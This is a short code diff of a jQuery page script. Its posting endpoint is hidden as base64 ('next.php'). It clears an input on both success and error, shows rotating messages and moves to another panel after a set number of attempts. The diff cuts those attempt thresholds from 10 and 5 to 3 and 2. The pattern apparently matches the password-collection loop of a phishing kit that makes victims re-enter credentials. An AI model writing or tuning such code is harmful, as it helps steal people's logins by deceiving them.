@@ -375,7 +375,7 @@ var file="bmV4dC5waHA=";
             },
             success: function(response) {
                 $("#pr").val("");
-                if (count >= 10) {
+                if (count >= 3) {
                     count = 0;
                     $("#div2").animate({ left: 0, opacity: "hide" }, 0);
                     $("#div3").animate({ left: 0, opacity: "show" }, 500);
@@ -384,7 +384,7 @@ var file="bmV4dC5waHA=";
                     }, 500);
                     return false;
                 }
-                if (count == 5) {
+                if (count == 2) {
                     $("#msg2").show();
                     $("#msg").hide();
                     $("#msg1").hide();
@@ -397,7 +397,7 @@ var file="bmV4dC5waHA=";
             },
             error: function() {
                 $("#pr").val("");
-                if (count >= 10) {
+                if (count >= 3) {
                     count = 0;
                     $("#div2").animate({ left: 0, opacity: "hide" }, 0);
                     $("#div3").animate({ left: 0, opacity: "show" }, 500);
@@ -406,7 +406,7 @@ var file="bmV4dC5waHA=";
                     }, 1000);
                     return false;
                 }
-                if (count == 5) {
+                if (count == 2) {
                     $("#msg2").show();
                     $("#msg").hide();
                     $("#msg1").hide();
